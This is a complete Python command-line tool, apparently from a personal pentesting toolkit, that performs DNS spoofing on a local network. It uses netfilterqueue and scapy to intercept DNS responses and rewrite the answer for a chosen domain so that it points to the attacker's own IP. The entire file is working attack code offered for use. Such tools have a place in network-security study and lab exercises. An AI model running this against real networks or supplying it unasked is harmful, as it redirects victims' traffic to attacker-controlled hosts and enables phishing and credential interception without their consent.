#!/usr/bin/env python3

import argparse
import netfilterqueue
import scapy.all as scapy
from modules.my_utils import show_message
from modules.net_utils import get_ip
from modules.sys_utils import enable_rules, disable_rules, check_root
from modules.exit_handler import setup_signal_handler

### Functions #############################################################################################################

def get_arguments():
    parser = argparse.ArgumentParser(description="DNS Spoofer")
    parser.add_argument("-d", "--domain", dest="domain", required=True, help="Select the domain to spoof")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Select the interface to spoof")

    options = parser.parse_args()
    return options.domain, options.interface

def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()

        if DOMAIN in qname:
            show_message("Envenenando el dominio: ", "info", DOMAIN)

            answer = scapy.DNSRR(rrname=qname, rdata=IP)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(scapy_packet.build())

    packet.accept()

def main():

    check_root()
    setup_signal_handler(disable_rules)
    show_message("Executing:", "info", "DNS Spoofer")

    global DOMAIN, interface, IP
    DOMAIN, interface = get_arguments()
    IP = get_ip(interface)
        
    enable_rules()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
    
if __name__ == "__main__":
    main()
